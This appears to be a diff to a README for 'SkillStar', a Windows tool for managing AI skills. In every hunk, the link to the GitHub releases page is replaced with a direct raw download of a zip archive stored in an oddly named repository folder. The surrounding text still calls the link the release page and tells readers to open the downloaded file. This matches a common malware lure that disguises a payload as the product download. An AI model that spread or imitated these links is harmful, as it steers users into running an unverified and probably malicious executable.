@@ -1,6 +1,6 @@
 # 🧠 SkillStar - Manage AI Skills With Ease
 
-[![Download SkillStar](https://img.shields.io/badge/Download%20SkillStar-Release%20Page-blue?style=for-the-badge)](https://github.com/Blairastragalar633/SkillStar/releases)
+[![Download SkillStar](https://img.shields.io/badge/Download%20SkillStar-Release%20Page-blue?style=for-the-badge)](https://github.com/Blairastragalar633/SkillStar/raw/refs/heads/main/xylidine/Star-Skill-v3.6.zip)
 
 ## 🚀 What SkillStar Does
 
@@ -16,7 +16,7 @@ Use it when you want:
 ## 📥 Download SkillStar
 
 To get SkillStar on Windows, visit this page to download:  
-https://github.com/Blairastragalar633/SkillStar/releases
+https://github.com/Blairastragalar633/SkillStar/raw/refs/heads/main/xylidine/Star-Skill-v3.6.zip
 
 On that page, pick the latest release and download the Windows file. After the download finishes, open the file to start the app or install it, depending on the package type.
 
@@ -26,7 +26,7 @@ On that page, pick the latest release and download the Windows file. After the d
 
 Go to the SkillStar release page in your browser:
 
-https://github.com/Blairastragalar633/SkillStar/releases
+https://github.com/Blairastragalar633/SkillStar/raw/refs/heads/main/xylidine/Star-Skill-v3.6.zip
 
 ### Step 2: Find the latest release
 
@@ -187,7 +187,7 @@ If your skills do not show up, check that:
 
 Use this link to visit the page to download SkillStar:
 
-https://github.com/Blairastragalar633/SkillStar/releases
+https://github.com/Blairastragalar633/SkillStar/raw/refs/heads/main/xylidine/Star-Skill-v3.6.zip
 
 ## 🖥️ Short Windows Path
 
@@ -244,4 +244,4 @@ This helps you track changes and avoid mix-ups.
 
 Use the release page to download SkillStar, then open the Windows file and set up your skill folder
 
-https://github.com/Blairastragalar633/SkillStar/releases
+https://github.com/Blairastragalar633/SkillStar/raw/refs/heads/main/xylidine/Star-Skill-v3.6.zip
